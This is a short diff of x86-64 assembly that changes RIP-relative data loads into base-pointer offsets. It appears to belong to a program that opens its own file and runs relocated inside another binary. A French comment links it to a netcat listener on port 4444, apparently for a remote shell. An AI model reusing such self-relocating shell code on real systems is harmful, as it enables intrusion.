@@ -20,7 +20,11 @@ end_:
 
 
 	mov		rax, SYS_open
-	lea		rdi, [rel self]
+
+	mov		rdi, [rbp + 16]
+	add		rdi, mydata.self
+
+	;lea		rdi, [rel self]
 	xor		rsi, rsi
 	NOP
 	NOP
@@ -39,7 +43,11 @@ end_:
 
 	mov		rax, SYS_pread64
 	mov		rdi, r12
-	lea		rsi, [rel zero]
+
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.zero
+
+	;lea		rsi, [rel zero]
 	mov		rdx, 1
 	mov		r10, 10
 	syscall
@@ -76,7 +84,11 @@ end_:
 		; c'est la commande que j'utilise avec
 		; nc -lvnp 4444
 		mov		rax, SYS_open
-		lea		rdi, [rel pathv]
+
+		mov		rdi, [rbp + 16]
+		add		rdi, mydata.pathv
+
+		;lea		rdi, [rel pathv]
 		mov		rsi, 2
 		NOP
 		NOP
